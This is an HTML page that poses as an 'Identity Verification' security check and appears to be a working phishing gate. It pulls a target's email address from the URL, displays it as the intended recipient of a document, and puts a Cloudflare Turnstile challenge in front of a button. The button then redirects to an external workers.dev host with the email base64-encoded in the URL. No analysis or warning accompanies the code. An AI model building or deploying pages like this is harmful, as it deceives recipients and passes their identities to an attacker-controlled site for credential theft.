<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Identity Verification</title>
    <!-- Cloudflare Turnstile Script -->
    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
    <style>
        body { font-family: -apple-system, system-ui, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f4f7f9; margin: 0; }
        .box { background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); text-align: center; max-width: 400px; border: 1px solid #e2e8f0; }
        .btn { background: #0078d4; color: white; padding: 14px 30px; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; font-size: 16px; }
        .btn:hover { background: #005a9e; }
        .btn:disabled { 
            background: #0078d4; 
            opacity: 0.5; 
            cursor: not-allowed; 
        }
        .btn:disabled:hover { 
            background: #0078d4;
        }
        #email-display { font-weight: bold; color: #1a365d; word-break: break-all; }
        .turnstile-container { margin: 20px 0; min-height: 65px; display: flex; justify-content: center; }
        .debug-info { font-size: 10px; color: #666; margin-top: 10px; text-align: left; background: #f0f0f0; padding: 8px; border-radius: 4px; display: none; }
    </style>
</head>
<body>
    <div class="box">
        <h2 style="color: #1a365d;">Security Check</h2>
        <p style="color: #4a5568;">This Document is intended for:<br><span id="email-display">Loading...</span></p>
        <p style="color: #4a5568; font-size: 14px;">Please complete the security check below.</p>
        
        <!-- Turnstile Widget Container -->
        <div class="turnstile-container">
            <div class="cf-turnstile" 
                 data-sitekey="0x4AAAAAACFsGXUXNkYsFRn4"
                 data-callback="onTurnstileSuccess"
                 data-error-callback="onTurnstileError"
                 data-theme="auto"
                 data-size="normal">
            </div>
        </div>
        
        <button class="btn" id="verifyBtn" onclick="jump()" disabled>Click Here To Continue</button>
        <div class="debug-info" id="debugInfo"></div>
    </div>

    <script>
        // Debug function to log and show info
        function debugLog(message) {
            console.log(message);
            const debugDiv = document.getElementById('debugInfo');
            if (debugDiv) {
                debugDiv.style.display = 'block';
                debugDiv.innerHTML += new Date().toLocaleTimeString() + ': ' + message + '<br>';
            }
        }
        
        // --- Function to check if a string is valid Base64 ---
        function isBase64(str) {
            if (!str || str.trim() === '') return false;
            try {
                // Check if string contains only valid base64 characters
                const base64Regex = /^[A-Za-z0-9+/]+=*$/;
                if (!base64Regex.test(str)) return false;
                const decoded = atob(str);
                const reencoded = btoa(decoded);
                return reencoded === str;
            } catch (err) {
                return false;
            }
        }
        
        // --- Extract email from URL path OR hash fragment ---
        function getEmailFromUrl() {
            debugLog("=== Starting email extraction ===");
            debugLog("Full URL: " + window.location.href);
            debugLog("Hash: " + (window.location.hash || "(none)"));
            debugLog("Pathname: " + window.location.pathname);
            
            // METHOD 1: Check hash fragment first (everything after #)
            const hash = window.location.hash;
            if (hash && hash.length > 1) {
                debugLog("Hash detected: " + hash);
                let hashValue = hash.substring(1); // Remove the '#'
                debugLog("Hash value (raw): " + hashValue);
                
                // Remove any trailing slashes or query params
                if (hashValue.includes('?')) hashValue = hashValue.split('?')[0];
                if (hashValue.includes('&')) hashValue = hashValue.split('&')[0];
                if (hashValue.endsWith('/')) hashValue = hashValue.slice(0, -1);
                
                // URL decode if needed
                try {
                    let decodedHash = decodeURIComponent(hashValue);
                    debugLog("After URL decode: " + decodedHash);
                    
                    // Check if it's base64
                    if (isBase64(decodedHash)) {
                        let email = atob(decodedHash);
                        debugLog("✅ SUCCESS: Decoded base64 from hash: " + email);
                        return email;
                    }
                    // Check if it's already an email
                    else if (decodedHash.includes('@') && decodedHash.includes('.')) {
                        debugLog("✅ SUCCESS: Found plain email in hash: " + decodedHash);
                        return decodedHash;
                    }
                    // Try to see if the decodedHash itself is base64 (double encoding)
                    else if (isBase64(decodedHash) === false && decodedHash.length > 5) {
                        // Try one more time - maybe it's base64 without proper padding
                        try {
                            let possibleBase64 = decodedHash.replace(/-/g, '+').replace(/_/g, '/');
                            if (isBase64(possibleBase64)) {
                                let email = atob(possibleBase64);
                                debugLog("✅ SUCCESS: Decoded base64 (with fixes) from hash: " + email);
                                return email;
                            }
                        } catch(e) {}
                    }
                } catch(e) {
                    debugLog("Error decoding hash: " + e.message);
                }
            } else {
                debugLog("No hash fragment found");
            }
            
            // METHOD 2: Check pathname segments (original method)
            const path = window.location.pathname;
            if (path && path !== '/') {
                debugLog("Checking pathname: " + path);
                const parts = path.split('/').filter(seg => seg.length > 0);
                debugLog("Path segments: " + JSON.stringify(parts));
                
                // Try each segment from last to first
                for (let i = parts.length - 1; i >= 0; i--) {
                    let segment = parts[i];
                    debugLog("Testing segment: " + segment);
                    
                    // Try URL decode first
                    try {
                        segment = decodeURIComponent(segment);
                        debugLog("After URL decode: " + segment);
                    } catch(e) {}
                    
                    // Check if it's base64
                    if (isBase64(segment)) {
                        try {
                            let email = atob(segment);
                            if (email.includes('@') || email.length > 3) {
                                debugLog("✅ SUCCESS: Decoded base64 from path: " + email);
                                return email;
                            }
                        } catch(e) {}
                    }
                    // Check if it's already an email
                    else if (segment.includes('@') && segment.includes('.')) {
                        debugLog("✅ SUCCESS: Found plain email in path: " + segment);
                        return segment;
                    }
                }
            }
            
            // METHOD 3: Check the entire URL for base64 pattern
            const fullUrl = window.location.href;
            const base64Pattern = /([A-Za-z0-9+/]{16,}={0,2})/g;
            let matches = fullUrl.match(base64Pattern);
            if (matches) {
                debugLog("Found potential base64 patterns: " + JSON.stringify(matches));
                for (let match of matches) {
                    if (isBase64(match)) {
                        try {
                            let email = atob(match);
                            if (email.includes('@')) {
                                debugLog("✅ SUCCESS: Found base64 in URL: " + email);
                                return email;
                            }
                        } catch(e) {}
                    }
                }
            }
            
            // Fallback
            debugLog("⚠️ No email found, using fallback");
            return "fallback@example.com";
        }
        
        // Get and display email
        const userEmail = getEmailFromUrl();
        const emailDisplay = document.getElementById('email-display');
        emailDisplay.textContent = userEmail;
        debugLog("=== FINAL EMAIL: " + userEmail + " ===");
        
        // Show warning if fallback is being used
        if (userEmail === "fallback@example.com") {
            emailDisplay.style.color = "#e74c3c";
            debugLog("WARNING: Using fallback email. Check your URL format!");
        }
        
        // --- Turnstile Callback Functions ---
        let turnstileToken = null;
        
        function onTurnstileSuccess(token) {
            console.log("Turnstile challenge passed. Token:", token);
            turnstileToken = token;
            document.getElementById('verifyBtn').disabled = false;
            debugLog("Turnstile verified, button enabled");
        }
        
        function onTurnstileError() {
            console.log("Turnstile challenge failed or encountered an error.");
            turnstileToken = null;
            document.getElementById('verifyBtn').disabled = true;
            debugLog("Turnstile error, button disabled");
        }
        
        // --- Jump function ---
        function jump() {
            if (!turnstileToken) {
                alert("Please complete the security check first.");
                return;
            }
            
            // Encode the email to Base64
            let b64;
            try {
                b64 = btoa(userEmail);
                debugLog("Encoding email to base64: " + userEmail + " -> " + b64);
            } catch(e) {
                debugLog("Base64 encoding failed: " + e.message);
                alert("Error encoding email. Please contact support.");
                return;
            }
            
            // Construct target URL
            const target = "https://proposal-layout6674453bold-resonance-b7c9.jonathanakers1775.workers.dev/?" + b64;
            debugLog("Redirecting to: " + target);
            
            // Redirect
            window.location.replace(target);
        }
        
        // Test both URL formats from console
        console.log("=== Script Loaded ===");
        console.log("To test hash format, visit URL with: #dGVzdEBhYmMuY29t at the end");
        console.log("To test path format, visit URL with: /dGVzdEBhYmMuY29t at the end");
    </script>
</body>
</html>
